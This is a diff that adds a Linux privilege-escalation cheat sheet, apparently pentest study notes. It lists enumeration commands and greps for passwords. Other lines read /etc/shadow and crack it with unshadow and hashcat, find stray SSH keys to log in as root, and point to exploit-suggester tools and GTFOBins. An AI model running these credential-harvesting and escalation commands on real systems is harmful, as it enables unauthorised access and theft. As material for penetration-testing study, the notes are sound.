@@ -1,0 +1,83 @@
+##System Enumeration:
+uname -a
+cat /proc/version
+cat /etc/issue
+lscpu
+ps aux
+ps aux | grep root
+
+##User Enumeration:
+whoami
+id
+sudo -l
+cat /etc/passwd
+cat /etc/passwd | cut -d ":" -f 1
+cat /etc/shadow
+cat /etc/group
+history
+
+##Network Enumeration:
+ifconfig
+ip a
+ip route
+ip neigh
+netstat -ano
+
+##Password Hunting:
+grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+grep --color=auto -rnw '/' -ie "PASS=" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+find / -name id_rsa 2> /dev/null
+
+##Automated Tools:
+https://github.com/rebootuser/LinEnum
+https://github.com/The-Z-Labs/linux-exploit-suggester
+https://github.com/jondonas/linux-exploit-suggester-2
+https://github.com/0dayhunter/Linux-exploit-suggester
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+https://github.com/sleventyeleven/linuxprivchecker
+
+##kernel Exploits:
+https://github.com/lucyoa/kernel-exploits
+
+uname -a and search by kernel name
+
+##Escalation via stored Based Passwords:
+history
+is -la
+cat .bash_history
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+cat /etc/security/opasswd
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+strings /dev/mem -n10 | grep -i PASS
+locate password | more   
+
+##Escalation Via weak file permission:
+ls -la /etc/passwd
+ls -la /etc/shadpw
+cat /etc/passwd
+cat /etc/shadow
+
+copy shadow and passwd file in a folder : unshadow passwd shadow
+hashcat -m 1800 cred.txt rockyou.txt -O
+
+https://github.com/unstable-deadlock/brashendeavours.gitbook.io/blob/master/pentesting-cheatsheets/hashcat-hash-modes.md
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+##Escalation via SSH key:
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+if you find any RSA key and try to login with ssh.
+ssh -i id_rsa root@10.10.10.10
+
+
+##Escalation Path : Sudo:
+sudo shell Escape:
+sudo -l
+
+
+https://gtfobins.github.io/
+
